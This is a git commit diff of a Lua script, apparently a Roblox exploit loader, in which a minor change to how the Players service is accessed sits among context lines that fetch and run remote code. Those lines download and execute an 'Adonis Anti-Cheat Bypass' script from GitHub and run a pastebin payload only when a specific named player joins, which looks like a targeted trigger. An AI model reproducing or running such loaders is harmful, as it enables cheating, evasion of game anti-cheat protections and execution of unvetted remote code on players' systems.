8ae5584a5d9d7080853957a56b2d3ccc47c43dfd
LeanClient <108145692+LeanClient@users.noreply.github.com>
2024-02-24 16:34:33 +0000

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -2,7 +2,7 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-game:GetService("Players").PlayerAdded:Connect(function(Player)
+game.Players.PlayerAdded:Connect(function(Player)
 if Player.Name == "ProAIt5000" then
 		loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
 		else
